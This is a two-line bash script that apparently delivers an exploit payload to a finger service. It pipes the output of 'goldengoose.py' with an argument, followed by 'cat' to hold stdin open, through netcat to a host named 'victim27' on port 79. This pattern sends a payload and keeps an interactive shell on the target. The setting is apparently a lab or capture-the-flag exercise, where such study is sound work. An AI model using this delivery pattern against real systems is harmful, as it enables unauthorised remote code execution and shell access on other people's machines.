#!/bin/bash
(python3 goldengoose.py 4152 && cat) | nc victim27 79


